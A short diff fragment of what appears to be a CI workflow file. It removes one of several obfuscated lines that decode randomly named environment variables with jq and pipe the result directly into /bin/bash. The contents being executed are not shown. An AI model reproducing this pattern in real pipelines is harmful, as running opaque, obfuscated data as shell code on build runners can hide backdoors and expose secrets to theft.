@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$xfam03749" | jq -r .m70593 | /bin/bash
           printf '%s' "$qhwiz8" | jq -r .o256 | /bin/bash
-          printf '%s' "$v42110" | jq -r .g73839 | /bin/bash
           printf '%s' "$pdaxx193" | jq -r .ogpe49119 | /bin/bash
           echo $nwmzw80 | jq -r .chco5129 | /bin/bash
 
